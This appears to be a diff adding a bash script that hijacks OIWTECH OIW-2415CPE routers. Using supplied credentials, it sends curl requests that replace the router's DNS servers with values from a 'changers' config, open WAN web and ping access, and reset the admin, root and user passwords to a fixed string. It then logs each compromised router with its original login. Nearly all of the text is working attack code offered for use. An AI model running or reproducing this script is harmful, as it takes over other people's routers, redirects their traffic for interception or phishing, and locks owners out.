@@ -1,0 +1,20 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "dns1=$DNS1&dns2=$DNS2&dns3=$DNS1&pingWanAccess=ON&webWanAccess=ON&webPort=80&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&dnsMode=dnsManual" "http://$HOSTNAME/goform/formWanTcpipSetup" 1>/dev/null 2>/dev/null
+${CURL} -u "admin:$PASSWD" -d "username=$USERNAME&newpass=$PASSWD&confpass=$PASSWD&submit-url=/status.asp" "http://$HOSTNAME/goform/formPasswordSetup" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" -d "username=root&newpass=$PASSWD&confpass=$PASSWD" "http://$HOSTNAME/goform/formPasswordSetup" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" -d "username=admin&newpass=$PASSWD&confpass=$PASSWD" "http://$HOSTNAME/goform/formPasswordSetup" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [OIWTECH OIW-2415CPE]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [OIWTECH OIW-2415CPE]" >> logs/modificados.log
